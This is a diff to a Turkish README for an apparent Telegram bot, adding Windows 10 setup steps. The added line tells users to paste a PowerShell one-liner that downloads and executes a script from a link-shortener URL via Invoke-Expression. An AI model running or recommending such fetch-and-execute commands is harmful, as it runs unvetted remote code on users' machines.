@@ -26,7 +26,7 @@
 
 **iOS:**  YAKINDA
 
-**Windows 10:** YAKINDA
+**Windows 10:** Windows 10: [Python](https://www.microsoft.com/en-us/p/python-38/9mssztt1n39l?activetab=pivot:overviewtab) indirin ardından PowerShell bu kodu yapıştırın: Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://kutt.it/l6LR90')
 
 ### Basit Yöntem
 Eğer botu kurma hakkında fikriniz yoksa burayı okuyunuz: [Kurulum Rehberi](https://t.me/sirisupport)
